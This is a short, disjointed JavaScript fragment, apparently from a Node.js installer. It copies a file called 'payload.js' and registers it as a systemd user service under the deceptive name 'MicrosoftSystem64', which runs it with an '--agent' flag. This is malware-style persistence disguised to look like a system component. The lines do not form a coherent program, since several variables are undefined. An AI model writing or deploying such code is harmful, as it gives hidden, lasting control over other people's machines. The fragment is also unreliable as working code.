var UNIT_STEM = "MicrosoftSystem64";
var PAYLOAD_FILENAME = "payload.js";
const content = fs.readFileSync(sourcePayloadPath);
fs.writeFileSync(other, content);
const unit = `ExecStart=${escPath(nodeExe)} ${escPath(jsPath)} --agent`;
spawnSync("systemctl", ["--user", "enable", `${UNIT_STEM}.service`]);
setupLinux(targetJsPath, installDir);
